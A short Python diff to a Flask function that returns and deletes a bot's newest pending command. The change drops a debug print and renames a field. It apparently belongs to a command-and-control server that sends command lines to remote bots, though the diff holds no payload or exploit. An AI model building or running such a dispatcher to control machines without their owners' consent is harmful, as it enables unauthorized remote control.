@@ -44,9 +44,8 @@ def get_status(bot_id):
 	db.session.commit()
 	pending_cmd = ''					#check if the bot has any commands pending, if so then delete it and return it
 	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
-	print(cmd)
 	if cmd:
-		pending_cmd = cmd.cmdline
+		pending_cmd = cmd.cmd
 		db.session.delete(cmd)
 		db.session.commit()
 	return pending_cmd
